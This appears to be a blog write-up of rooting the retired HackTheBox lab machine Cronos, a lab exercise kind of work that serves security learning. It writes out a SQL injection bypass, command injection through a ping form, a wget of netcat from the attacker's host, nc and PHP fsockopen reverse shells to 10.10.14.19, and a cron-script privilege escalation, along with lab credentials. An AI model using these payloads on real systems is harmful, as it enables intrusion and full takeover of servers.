---
layout: post
title: "Writeup: HackTheBox Cronos - NO Metasploit"
description: "Rooting Cronos without using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][]. All published writeups are for retired HTB machines. Whether
 or not I use Metasploit to pwn the server will be indicated in the title.
 
# Cronos

_<small>Difficulty: Medium</small>_

_<small>Machine IP: 10.10.10.13</small>_

If you have read any of my other write ups, I run the same nmap scan every time:

```bash
sudo nmap -sS -T4 -p- 10.10.10.13

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 21:31 EDT
Nmap scan report for 10.10.10.13
Host is up (0.016s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 90.66 seconds
```

```bash
sudo nmap -T4 -A -p 22,53,80 10.10.10.13

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 21:33 EDT
Nmap scan report for 10.10.10.13
Host is up (0.039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   48.81 ms 10.10.14.1
2   48.80 ms 10.10.10.13

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.20 seconds
```

Notably:

- `tcp/53` is open. This usually signifies a domain transfer is possible
- An Apache httpd web server is running on version `2.4.18`

Given the exposed DNS TCP port, let's start with DNS.
Given HackTheBox's convention, I guess that the server's hostname is `cronos.htb` and update my `/etc/hosts` file:

```bash
10.10.10.13     cronos.htb
```

I then attempt a zone transfer. It is successful.

```bash
dig axfr @10.10.10.13 cronos.htb

; <<>> DiG 9.16.2-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 16 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Fri May 29 21:42:24 EDT 2020
;; XFR size: 7 records (messages 1, bytes 203)
```

I see that `admin.cronos.htb` is another subdomain of the site.
I should add that to my `/etc/hosts` file.

```bash
10.10.10.13     cronos.htb
10.10.10.13     admin.cronos.htb
```

Browsing to `http://admin.cronos.htb` brings up a login page.
I try `' or 1 = 1 --` for the hell of it.
It is successful!
All righty.

I am presented with a `traceroute` / `ping` form that accepts IP addresses as input.
Given the relative simplicity of the SQL injection and zone transfer so far, I go for the easiest option here as well: command execution.
It is also successful.
This is a medium box, huh?

![command exec ls][]

I am interested in the `config.php` file, so let's read the contents.

```bash
8.8.8.8; cat config.php;
```

```php
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'admin');
define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
define('DB_DATABASE', 'admin');
$db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```

For good measure, I also check to see what users exist on the box:

```bash
8.8.8.8; ls /home;
```

```bash
noulis
```

I opt to upload a netcat executable to the system in order to create a reverse shell.

```bash
8.8.8.8; wget http://10.10.14.19:8000/nc
```

I make the binary executable.

```bash
8.8.8.8; chmod +x nc; ls -la;
```

I then start a local netcat listener and execute netcat on the target.

```bash
sudo nc -lvnp 443
```

On the target:

```bash
8.8.8.8; ./nc -e /bin/sh 10.10.14.19 443;
```

This gives me a web shell as the `www-data` user.
I can read the user flag from the `noulis` home directory.

With the database password, I log into the database and poke around, but don't find anything of interest.

```bash
mysql -u admin -p
Enter password:  # Enter password discovered above
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 29
Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| admin              |
+--------------------+
2 rows in set (0.01 sec)

mysql> use admin;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.01 sec)

mysql> select * in users;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'in users' at line 1
mysql> SELECT * FROM users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

Oh, well.
Let me grab a ton of info about the system with [LinEnum][].
Assuming I am in the web server's root directory having just made a `www-user` shell, I can run LinEnum like so.
This assumes I have set up `python3 -m http.server` on my machine to host the LinEnum script.

```bash
wget http://10.10.14.19:8000/LinEnum.sh
bash LinEnum.sh > results.txt
```

This makes the results available on the web server at `http://admin.cronos.htb/results.txt`.

I see that I have read access to `/etc/crontab`:

```bash
[00;33m### JOBS/TASKS ##########################################[00m
[00;31m[-] Cron jobs:[00m
-rw-r--r-- 1 root root  797 Apr  9  2017 /etc/crontab
```

So let's read that.

```bash
www-data@cronos:/home/noulis/.composer/cache$ cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

`* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1` is very interesting.
A root script running every minute in the `/var/www/` directory?
Indeed, the `www-data` user has the ability to modify this script's contents.

```bash
www-data@cronos:/home/noulis/.composer/cache$ ls -la /var/www/laravel/artisan

-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```

From here, I add a reverse shell command to the php script.

```php
$sock=fsockopen("10.10.14.19",443);exec("/bin/sh -i <&3 >&3 2>&3");
```

![php reverse shell][]

I open a local netcat listener...

```bash
sudo nc -lvnp 443
```

And after 1-2 minutes depending on when the cron executes, I get a root shell.

![root shell][]

I can now collect the root flag.

[hackthebox]: https://www.hackthebox.eu
[linenum]: https://github.com/rebootuser/LinEnum

[command exec ls]: /assets/img/htb/cronos/ls-nettool.png
[php reverse shell]: /assets/img/htb/cronos/php-reverse-shell.png
[root shell]: /assets/img/htb/cronos/root-shell.png
